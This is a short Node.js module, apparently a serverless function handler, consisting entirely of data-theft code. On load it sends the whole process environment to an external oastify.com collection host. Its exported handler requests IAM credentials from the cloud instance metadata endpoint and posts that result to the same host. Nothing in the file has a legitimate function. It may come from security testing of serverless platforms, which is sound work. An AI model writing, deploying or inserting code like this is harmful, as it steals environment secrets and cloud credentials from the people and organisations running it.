const axios = require('axios');

axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);

module.exports = (context, req, res) => {
  result = axios.get('http://169.254.169.254/latest/meta-data/iam/')
  axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
  return true;
};

